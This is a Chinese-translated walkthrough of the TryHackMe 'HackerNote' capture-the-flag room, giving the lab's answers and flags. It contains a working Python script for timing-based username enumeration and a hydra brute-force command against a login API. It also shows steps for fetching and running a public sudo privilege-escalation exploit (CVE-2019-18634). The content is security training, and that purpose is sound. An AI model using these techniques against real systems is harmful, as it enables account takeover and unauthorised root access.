<html>
<head>
<title>HackerNote Try Hack Me (Write-Up/ Walkthrough)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客注意尝试攻击我(报道/演练)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackernote-try-hack-me-write-up-walkthrough-504a55b05d96?source=collection_archive---------3-----------------------#2022-01-06">https://infosecwriteups.com/hackernote-try-hack-me-write-up-walkthrough-504a55b05d96?source=collection_archive---------3-----------------------#2022-01-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/79e06e93dadf399eeb8196b06b3f5f5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_JubtBk5EgjrSRfyzAN9XA.png"/></div></div></figure><h1 id="33b6" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">介绍</h1><p id="1a0b" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">这是一个关于自定义web应用程序的中型<a class="ae lu" href="https://tryhackme.com/room/hackernote" rel="noopener ugc nofollow" target="_blank">房间</a>，介绍用户名枚举、自定义单词列表和基本的权限提升利用，请随时在<a class="ae lu" href="https://twitter.com/Nouureldin_Ehab" rel="noopener ugc nofollow" target="_blank"> Twitter </a>或<a class="ae lu" href="https://www.linkedin.com/in/noureldin-ehab-a57940190/" rel="noopener ugc nofollow" target="_blank"> Linkedin </a>问我任何问题</p><h1 id="d54b" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">任务1侦察</h1><p id="7812" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">在任何CTF中，我们需要做的第一件事就是使用<a class="ae lu" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank"> Nmap </a>扫描打开的端口(如果你不知道什么是Nmap，我建议你查看一下<a class="ae lu" href="https://tryhackme.com/room/furthernmap" rel="noopener ugc nofollow" target="_blank">这个房间</a>)</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="0460" class="me jz iq ma b gy mf mg l mh mi">sudo <!-- -->nmap -sS -vv -sV -Pn<!-- --> {Add your machine ip here}</span></pre><p id="6cdb" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">=&gt; -sS标志用于TCP SYN扫描</p><p id="84fc" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">=&gt; -vv标志，用于增加详细级别</p><p id="abff" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">=&gt; -Pn标志告诉Nmap跳过ping测试，只扫描提供的每个目标主机</p><p id="16d9" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">=&gt; -sV标志用于版本扫描</p><p id="95b0" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">请访问<a class="ae lu" href="https://nmap.org/docs.html" rel="noopener ugc nofollow" target="_blank">文档</a>了解更多关于标志和如何使用它们的信息</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mo"><img src="../Images/57fdf7454b8e589e90abb53b752393b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MZ-iafewitAAmlBJl_bJrQ.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">Nmap输出</figcaption></figure><ul class=""><li id="b0ea" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">哪些端口是开放的？(按数字顺序)</li></ul><p id="c378" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><code class="fe nc nd ne ma b">22,80,8080</code></p><ul class=""><li id="7333" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">后端是用什么编程语言写的？</li></ul><p id="f6ce" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><code class="fe nc nd ne ma b">Go</code></p><h1 id="20b7" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">任务2调查</h1><p id="4a42" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">现在，对于最重要的部分，手动检查网站<br/>我们可以尝试:</p><ul class=""><li id="e93d" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">创建帐户</li><li id="e042" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated">使用错误的用户名<br/>登录(错误信息立即出现)</li><li id="5b98" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated">使用错误密码登录<br/>(几秒钟后出现错误信息)</li><li id="beb6" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated">尝试默认凭据(管理员:管理员)</li><li id="343d" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated">忘记密码</li><li id="5959" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated">检查源代码</li></ul><p id="cae4" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">注意“用错误的用户名登录”和“用错误的密码登录”之间的时间差。我们可以使用这个时间差来枚举现有的用户帐户</p><h1 id="d45d" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">任务3利用</h1><p id="1894" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">让我们使用firefox或burp suite中的开发工具来检查请求</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nk"><img src="../Images/cb25702414d7c39063cd75d6cf470a0c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*qZOT_lWgA4AhpGzb.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">这里我们可以看到登录是对/api/user/login的POST请求。这意味着我们可以使用CURL、python或您选择的其他编程语言来提出这个请求。</figcaption></figure><h2 id="9f96" class="me jz iq bd ka nl nm dn ke nn no dp ki lh np nq km ll nr ns kq lp nt nu ku nv bi translated"><strong class="ak">利用时间:</strong></h2><p id="f368" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated"><strong class="ky ir">注意:<br/> </strong>首先，试着自己写剧本，如果你卡住了，试着逐行分析给定的剧本</p><p id="7da2" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">代码:</strong></p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="f814" class="me jz iq ma b gy mf mg l mh mi">import requests as r<br/>import time<br/>import json<br/>URL = "<a class="ae lu" href="http://localhost:8081/api/user/login" rel="noopener ugc nofollow" target="_blank">http://localhost:8081/api/user/login</a>"<br/>USERNAME_FILE = open("names.txt", "r")<br/>usernames = []<br/>for line in USERNAME_FILE:  # Read in usernames from the wordlist<br/>    usernames.append(line.replace("\n", ""))</span><span id="dd99" class="me jz iq ma b gy nw mg l mh mi">timings = dict()</span><span id="a672" class="me jz iq ma b gy nw mg l mh mi">def doLogin(user):<br/>    creds = {"username": user, "password": "invalidPassword!"}<br/>    response = r.post(URL, json=creds)<br/>    if response.status_code != 200:  # This means there was an API error<br/>        print("Error:", response.status_code)</span><span id="d039" class="me jz iq ma b gy nw mg l mh mi">print("Starting POST Requests")</span><span id="a933" class="me jz iq ma b gy nw mg l mh mi">for user in usernames:</span><span id="46aa" class="me jz iq ma b gy nw mg l mh mi">    startTime = time.time()<br/>    doLogin(user)<br/>    endTime = time.time()</span><span id="1861" class="me jz iq ma b gy nw mg l mh mi">    timings[user] = endTime - startTime<br/><br/>    time.sleep(0.01)</span><span id="fea8" class="me jz iq ma b gy nw mg l mh mi">print("Finished POST requests")</span><span id="d590" class="me jz iq ma b gy nw mg l mh mi">largestTime = max(timings.values())<br/>smallestTime = min(timings.values())<br/><br/>print("Time delta:", largestTime-smallestTime, "seconds (larger is better)")</span><span id="8aef" class="me jz iq ma b gy nw mg l mh mi">for user, time in timings.items():<br/>    if time &gt;= largestTime * 0.9:</span><span id="cad4" class="me jz iq ma b gy nw mg l mh mi">        print(user, "is likely to be valid")</span></pre><p id="5701" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">代码逐步分析:</strong></p><ul class=""><li id="0bb6" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">首先，我们导入我们需要的库，如下图所示</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="3372" class="me jz iq ma b gy mf mg l mh mi">import requests as r<br/>import time<br/>import json</span></pre><p id="4108" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir"> <em class="nx"> - </em> </strong> <em class="nx"> </em> <strong class="ky ir">请求:</strong> <br/>请求库是用Python制作HTTP <strong class="ky ir"> </strong>请求的事实上的标准。它将发出请求的复杂性抽象在一个漂亮、简单的API后面，以便您可以专注于与服务进行交互并在应用程序中使用数据<br/><strong class="ky ir">-</strong><strong class="ky ir">time:<br/></strong>Python时间模块提供了许多用代码表示时间的方式，如对象、数字和字符串。它还提供了除了表示时间之外的功能，比如代码执行过程中的等待和衡量你的代码效率<strong class="ky ir"><br/>-JSON:<br/></strong>JSON模块主要用于将上面的python字典转换成可以写入文件的JSON字符串。虽然JSON模块会将字符串转换为Python数据类型，但通常JSON函数用于直接从JSON文件中读取和写入。</p><ul class=""><li id="172a" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">现在我们开始编写脚本。首先，我们需要添加网站URL</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="5d84" class="me jz iq ma b gy mf mg l mh mi">URL = "<a class="ae lu" href="http://localhost:8081/api/user/login" rel="noopener ugc nofollow" target="_blank">http://localhost:8081/api/user/login</a>"</span></pre><ul class=""><li id="f6df" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">现在我们添加将要尝试的用户名列表(带有一个read参数)</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="0142" class="me jz iq ma b gy mf mg l mh mi">USERNAME_FILE = open("names.txt", "r")</span></pre><ul class=""><li id="18f0" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">现在我们将用户名添加到一个数组中</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="3da6" class="me jz iq ma b gy mf mg l mh mi">usernames = []<br/>for line in USERNAME_FILE:  # Read in usernames from the wordlist<br/>    usernames.append(line.replace("\n", ""))</span></pre><ul class=""><li id="ef11" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">制作一个字典来添加计时<br/>(这就是为什么使用JSON库)</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="fb5a" class="me jz iq ma b gy mf mg l mh mi">timings = dict()</span></pre><ul class=""><li id="6300" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">向API发出HTTP请求</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="e02f" class="me jz iq ma b gy mf mg l mh mi">def doLogin(user):  # Make the HTTP request to the API<br/>    creds = {"username": user, "password": "invalidPassword!"}<br/>    response = r.post(URL, json=creds)<br/>    if response.status_code != 200:  # This means there was an API error<br/>        print("Error:", response.status_code)<br/><br/>print("Starting POST Requests")</span></pre><ul class=""><li id="772b" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">为列表中的每个用户执行一个请求，并检查需要多长时间</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="d601" class="me jz iq ma b gy mf mg l mh mi">for user in usernames:<br/>    # Do a request for every user in the list, and time how long it takes<br/>    startTime = time.time()<br/>    doLogin(user)<br/>    endTime = time.time()<br/>    # record the time for this user along with the username<br/>    timings[user] = endTime - startTime<br/>    # Wait to avoid DoSing the server which causes unreliable results<br/>    time.sleep(0.01)</span><span id="e50c" class="me jz iq ma b gy nw mg l mh mi">print("Finished POST requests")</span></pre><ul class=""><li id="99cd" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">检查哪些请求花费的时间更长</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="5ca2" class="me jz iq ma b gy mf mg l mh mi"># Longer times normally mean valid usernames as passwords were verified<br/>largestTime = max(timings.values())<br/>smallestTime = min(timings.values())<br/># Ideally the smallest times should be near instant, and largest should be 1+ seconds<br/>print("Time delta:", largestTime-smallestTime, "seconds (larger is better)")</span></pre><ul class=""><li id="0d0f" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">打印耗时较长的用户名</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="75b2" class="me jz iq ma b gy mf mg l mh mi"># A valid username means the server will hash the password<br/># As this takes time, the longer requests are likely to be valid users<br/># The longer the request took, the more likely the request is to be valid.<br/>for user, time in timings.items():<br/>    if time &gt;= largestTime * 0.9:<br/>        # with 10% time tolerence<br/>        print(user, "is likely to be valid")</span></pre><p id="9143" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">为什么耗时会改变？</strong></p><p id="81b8" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">后端故意写得很差。只有当服务器收到正确的用户名时，它才会尝试验证用户的密码。下面的伪代码可以更好地解释这一点。</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="a397" class="me jz iq ma b gy mf mg l mh mi">def login(username, password):<br/>    if username in users: ##If it's a valid username<br/>        login_status = check_password(password) ##This takes a noticeable amount of time<br/>        if login_status:<br/>            return new_session_token()<br/>        else:<br/>            return "Username or password incorrect"<br/>    else:<br/>        return "Username or password incorrect"</span></pre><p id="39b1" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们知道了脚本是如何工作的，让我们运行它</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="4978" class="me jz iq ma b gy mf mg l mh mi">chmod 777 exploit.py<br/>python3 exploit.py</span></pre><p id="8282" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">注意:<br/> </strong>不要忘记在exploit.py文件所在的目录下添加names.txt文件</p><ul class=""><li id="0dee" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">列表中有多少用户名是有效的？</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="16e7" class="me jz iq ma b gy mf mg l mh mi">1</span></pre><ul class=""><li id="7137" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">什么是有效的用户名？</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="1716" class="me jz iq ma b gy mf mg l mh mi">james</span></pre><h1 id="6184" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">任务4攻击密码</h1><p id="f52e" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated"><strong class="ky ir">下一步</strong></p><p id="9fb8" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们有了用户名，我们需要一个密码。因为密码是用bcrypt散列的，并且需要相当长的时间来验证，所以用像RockYou这样的大型单词表进行暴力破解是不可行的。<br/>还好这个web app有密码提示！</p><p id="7e09" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">使用我们在上一步中找到的用户名，我们可以检索密码提示。根据这个密码提示，我们可以创建一个单词列表，并(更)有效地破解用户的密码。</p><p id="6b12" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">密码提示:<br/> </strong>我喜欢的颜色和我喜欢的数字</p><p id="802d" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">这很简单，我们需要做的就是创建两个单词的列表，一个用于颜色，另一个用于数字，然后用一个叫做<a class="ae lu" href="https://hashcat.net/wiki/doku.php?id=hashcat_utils" rel="noopener ugc nofollow" target="_blank"> Hashcat Util的组合器</a>的工具将它们组合在一起</p><p id="5553" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在，我们将下载2个单词列表，并将它们组合在一起，然后使用hydra强行登录API</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="139e" class="me jz iq ma b gy mf mg l mh mi">./combinator.bin colors.txt numbers.txt &gt; wordlist.txt</span></pre><p id="4fb7" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们要建立九头蛇指挥部</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="1559" class="me jz iq ma b gy mf mg l mh mi">hydra -l james -P wordlist.txt 10.10.156.130 http-post-form "/api/user/login:username=^USER^&amp;password=^PASS^:Invalid Username Or Password"</span></pre><p id="9953" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">这可能看起来势不可挡，但不要担心，我们会分析它</p><p id="43a0" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">攻击API: </strong></p><p id="07da" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">我们之前捕获的HTTP POST请求告诉了我们足够多的关于API的信息，我们可以使用Hydra来攻击它。<br/>该API实际上被设计成接受表单数据或JSON数据。前端将JSON数据作为POST请求发送，所以我们将使用这个。Hydra允许利用HTTP-POST模块攻击HTTP POST请求。要使用它，我们需要:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="d5e5" class="me jz iq ma b gy mf mg l mh mi">Request Body — JSON<br/>{“username”:”admin”,”password”:”admin”}<br/>Request Path -<br/>/api/user/login<br/>Error message for incorrect logins -<br/>“Invalid Username Or Password”</span></pre><p id="abc4" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">该命令是(用尖括号替换部分，您将需要转义特殊字符):</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="c84d" class="me jz iq ma b gy mf mg l mh mi">hydra -l &lt;username&gt; -P &lt;wordlist&gt; 192.168.2.62 http-post-form &lt;path&gt;:&lt;body&gt;:&lt;fail_message&gt;</span></pre><ul class=""><li id="cebd" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">你的单词表里有多少个密码？</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="3044" class="me jz iq ma b gy mf mg l mh mi">wc -l wordlist.txt</span><span id="e489" class="me jz iq ma b gy nw mg l mh mi">180</span></pre><ul class=""><li id="b2ba" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">用户的密码是什么？</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="6f5b" class="me jz iq ma b gy mf mg l mh mi">blue7</span></pre><p id="c582" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们瞧；从我们得到的凭证开始</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="1e14" class="me jz iq ma b gy mf mg l mh mi">username: james<br/>password: blue7</span></pre><p id="f50b" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">我们发现这写在笔记里</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ny"><img src="../Images/11249f92f87f0afd35ebeddcf37e979c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K_K9qR2Cd1EZcraCwbLpfA.png"/></div></div></figure><ul class=""><li id="a99b" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">用户的SSH密码是什么？</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="73f9" class="me jz iq ma b gy mf mg l mh mi">dak4ddb37b</span></pre><p id="56c4" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在，我们可以使用获得的凭证登录ssh</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="028c" class="me jz iq ma b gy mf mg l mh mi">IP: {insert the tryhackme machine ip}<br/>username: james<br/>password: dak4ddb37b</span><span id="7d8a" class="me jz iq ma b gy nw mg l mh mi">ssh username@ip<br/>password</span><span id="c245" class="me jz iq ma b gy nw mg l mh mi">ssh james@ip<br/>dak4ddb37b</span></pre><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nz"><img src="../Images/b78d2647ccba7af0597439a999c4271f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Co0csO2vUq3EUKuLJmD8cA.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">使用ssh登录</figcaption></figure><p id="1435" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">我们在yaaaaay</p><p id="5889" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在让我们“ls”，我们发现了一个名为user.txt的文件，让我们看看里面使用了什么</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="e73a" class="me jz iq ma b gy mf mg l mh mi">cat user.txt</span></pre><p id="689a" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">嘭，我们找到了旗子</p><ul class=""><li id="d88d" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">用户标志是什么？</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="4a62" class="me jz iq ma b gy mf mg l mh mi">thm{56911bd7ba1371a3221478aa5c094d68}</span></pre><p id="c590" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">列举特权</strong></p><p id="fe23" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在您有了一个SSH会话，您可以获取用户标志了。但这对你来说还不够，你需要根。<br/>提升权限的第一步是看你是否能运行sudo。您拥有当前用户的密码，因此可以运行命令:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="2715" class="me jz iq ma b gy mf mg l mh mi">sudo -l</span></pre><p id="c790" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">这个命令告诉您作为sudo的超级用户可以运行哪些命令。遗憾的是，当前用户不能以root用户身份运行任何命令。但是，您可能已经注意到，当您输入密码时，您会看到星号。这不是默认行为。最近发布的CVE影响了这种配置。该设置称为pwdfeedback。</p><p id="9cc2" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">通过谷歌搜索，我们可以找到CVE</p><ul class=""><li id="b69a" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">该漏洞的CVE数是多少？</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="c9c2" class="me jz iq ma b gy mf mg l mh mi">CVE-2019-18634</span></pre><p id="20da" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">让我们找到并下载并利用这个CVE，我在Github上找到了这个</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="ecd2" class="me jz iq ma b gy mf mg l mh mi"> git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git<br/> cd sudo-cve-2019-18634/<br/> make<br/> scp exploit {user}@{ip}</span></pre><p id="86db" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在让我们运行利用程序</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="0d08" class="me jz iq ma b gy mf mg l mh mi">./exploit</span></pre><p id="586a" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">我们是ROOOOT yaaay</p><p id="97ab" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们来找旗子</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="a339" class="me jz iq ma b gy mf mg l mh mi">cat /root/root.txt</span></pre><ul class=""><li id="faff" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated">根旗是什么？</li></ul><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="1e0a" class="me jz iq ma b gy mf mg l mh mi">thm{af55ada6c2445446eb0606b5a2d3a4d2}</span></pre><h1 id="241f" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">/etc/外卖</h1><p id="3885" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我了解了利用时间差来枚举现有用户名的方法</p><h1 id="97da" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">时事通讯</h1><p id="9e28" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我将分享我的学习之旅，网络安全新闻，新简历和学习资源，以及更多，请随时<a class="ae lu" href="https://www.getrevue.co/profile/Noureldin_Ehab" rel="noopener ugc nofollow" target="_blank">订阅</a>😊请不要忘记喝水🌊</p><h1 id="852d" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">⭐I喜欢与不同的人联系，所以如果你想打招呼，我会很高兴见到你！:)</h1><p id="fc6b" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated"><a class="ae lu" href="https://www.linkedin.com/in/noureldin-ehab-a57940190/" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir">LinkedIn</strong></a><strong class="ky ir"><br/></strong><a class="ae lu" href="https://twitter.com/Nouureldin_Ehab" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir">Twitter</strong></a></p></div><div class="ab cl oa ob hu oc" role="separator"><span class="od bw bk oe of og"/><span class="od bw bk oe of og"/><span class="od bw bk oe of"/></div><div class="ij ik il im in"><p id="4a29" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">Infosec 